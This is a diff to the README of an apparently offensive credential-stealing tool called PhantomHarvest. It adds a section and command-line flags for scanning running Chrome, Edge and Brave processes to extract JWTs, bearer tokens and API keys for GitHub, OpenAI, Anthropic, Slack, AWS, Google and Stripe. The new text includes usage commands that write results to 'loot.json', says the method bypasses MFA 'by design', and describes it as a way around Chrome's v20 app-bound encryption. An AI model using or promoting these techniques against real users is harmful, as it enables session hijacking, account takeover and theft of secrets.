@@ -196,6 +196,30 @@ phantom-harvest.exe -chrome-key <32-byte-hex> -browser chrome -logins-only
 phantom-harvest.exe -dpapi-masterkey <64-byte-hex> -browser chrome -logins-only
 ```
 
+### Live Browser Memory Token Extraction
+
+When offline cookie decryption is blocked (Chrome v20, Firefox with master
+password), **session tokens still sit in browser memory as plaintext**.
+PhantomHarvest can scan running Chrome/Edge/Brave processes and extract:
+
+- **JWTs** with decoded payload summary (issuer, subject, expiry)
+- **Bearer tokens** from cached `Authorization:` headers
+- **Service API keys**: GitHub PATs (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`),
+  OpenAI (`sk-`), Anthropic (`sk-ant-`), Slack (`xox[baprs]-`), AWS (`AKIA...`),
+  Google (`AIza...`), Stripe (`sk_live_` / `sk_test_`)
+
+```bash
+# Extract tokens from live browser memory (browser must be open)
+phantom-harvest.exe -extract-tokens -quiet
+
+# Combine with full scan
+phantom-harvest.exe -decrypt-browsers -extract-tokens -o loot.json
+```
+
+MFA-bypassing by design — these tokens are already authenticated and valid.
+Complements v20 encryption bypass: if app-bound encryption blocks the cookie
+file, grab the live session token from RAM instead.
+
 ### SharpChrome-Equivalent Features
 
 ```bash
@@ -232,6 +256,8 @@ Options:
   -cookies-out string        Export decrypted cookies in Netscape format
   -chrome-key string         Pre-decrypted Chrome AES key as hex (remote DPAPI)
   -dpapi-masterkey string    DPAPI masterkey as hex — auto-decrypts Chrome Local State
+  -v20-memscan               Scan chrome.exe memory for the v20 app-bound AES key
+  -extract-tokens            Extract JWTs / bearer tokens / API keys from live browser memory
   -o string                  Output file (auto-detects .json/.csv/.txt/.html)
   -csv string                Export to CSV
   -txt string                Export to TXT
